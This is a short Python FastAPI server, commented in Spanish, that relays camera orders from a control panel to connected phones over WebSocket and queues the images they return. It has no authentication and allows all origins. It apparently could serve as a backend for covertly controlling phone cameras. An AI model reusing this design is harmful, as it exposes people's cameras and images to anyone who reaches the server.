from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Body
from fastapi.middleware.cors import CORSMiddleware
import json
import os
import uvicorn

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

dispositivos_activos = {}
cola_imagenes = [] # Para que el panel las recoja por HTTP

@app.get("/")
async def root():
    return {"status": "Online", "devices": list(dispositivos_activos.keys())}

# El celular se sigue conectando por WebSocket (es más eficiente)
@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    dispositivos_activos[client_id] = websocket
    try:
        while True:
            data = await websocket.receive_text()
            mensaje = json.loads(data)
            # Guardamos la imagen en una cola para que el panel la pida
            cola_imagenes.append({"device_id": client_id, "image_data": mensaje.get("image_data")})
    except WebSocketDisconnect:
        if client_id in dispositivos_activos:
            del dispositivos_activos[client_id]

# EL PANEL USARÁ ESTAS RUTAS (HTTP) PARA EVITAR EL ERROR 403
@app.post("/enviar_orden")
async def enviar_orden(target_id: str = Body(...), accion: str = Body(...), camara: str = Body(...)):
    if target_id in dispositivos_activos:
        msg = json.dumps({"accion": accion, "camara": camara})
        await dispositivos_activos[target_id].send_text(msg)
        return {"status": "enviado"}
    return {"status": "error", "reason": "dispositivo_offline"}

@app.get("/obtener_imagenes")
async def obtener_imagenes():
    global cola_imagenes
    temp = cola_imagenes[:]
    cola_imagenes = []
    return temp

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)

